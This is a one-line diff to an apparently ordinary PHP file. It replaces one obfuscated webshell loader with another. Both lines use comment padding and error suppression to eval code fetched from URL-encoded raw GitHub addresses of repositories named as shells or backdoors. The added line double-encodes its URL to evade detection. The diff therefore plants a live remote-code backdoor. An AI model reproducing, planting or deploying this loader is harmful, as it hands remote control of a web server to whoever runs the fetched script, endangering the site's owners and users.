@@ -1,1 +1,1 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(rawurldecode(urldecode("https%3A%2F%2Fraw.githubusercontent.com%2FFRMFOX%2FSH3LL-BKDR%2Fmain%2Fgel4y-enc.php"))));/**/?>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(urldecode(rawurldecode("https%253A%252F%252Fraw.githubusercontent.com%252Fjustikail%252Fwebshell%252Fmain%252Ftemp.php"))));/**/?>
